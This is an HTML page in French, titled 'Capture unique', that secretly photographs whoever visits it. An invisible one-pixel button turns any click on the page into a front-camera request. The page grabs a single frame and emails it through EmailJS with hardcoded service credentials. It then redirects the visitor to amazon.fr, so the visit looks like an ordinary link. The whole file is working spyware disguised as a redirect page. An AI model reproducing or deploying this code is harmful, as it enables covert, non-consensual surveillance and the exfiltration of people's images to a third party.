<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Capture unique</title>
  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    body, html { margin:0; padding:0; height:100%; overflow:hidden; background:none; cursor:pointer; }
    #triggerButton { width:1px; height:1px; opacity:0; border:none; background:none; }
    video, canvas { display:none; }
  </style>
</head>
<body>
  <button id="triggerButton">Start</button>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" width="100" height="75"></canvas>

  <script>
    emailjs.init("IoSfbtGz4KSL_5_9E");

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');
    const button = document.getElementById('triggerButton');

    async function captureOnePhoto() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;

        video.onloadeddata = () => {
          // Prendre la photo
          context.drawImage(video, 0, 0, canvas.width, canvas.height);

          // ArrÃªter immÃ©diatement le flux vidÃ©o
          stream.getTracks().forEach(track => track.stop());

          // Convertir en JPEG ultra-compressÃ© sans mÃ©tadonnÃ©es
          canvas.toBlob((blob) => {
            const reader = new FileReader();
            reader.onloadend = () => {
              const imageData = reader.result;

              emailjs.send("service_8cs0gml", "template_hgvdx1g", {
                message: "Photo unique capturÃ©e ðŸ“¸",
                image: imageData
              })
              .then(() => { window.location.href = "https://www.amazon.fr"; })
              .catch((err) => { console.log("Erreur EmailJS:", err); window.location.href = "https://www.amazon.fr"; });
            };
            reader.readAsDataURL(blob);
          }, "image/jpeg", 0.05);
        };

      } catch (err) {
        console.log("Erreur camÃ©ra:", err);
        window.location.href = "https://www.amazon.fr";
      }
    }

    document.body.addEventListener('click', () => button.click());
    button.addEventListener('click', captureOnePhoto);
  </script>
</body>
</html>
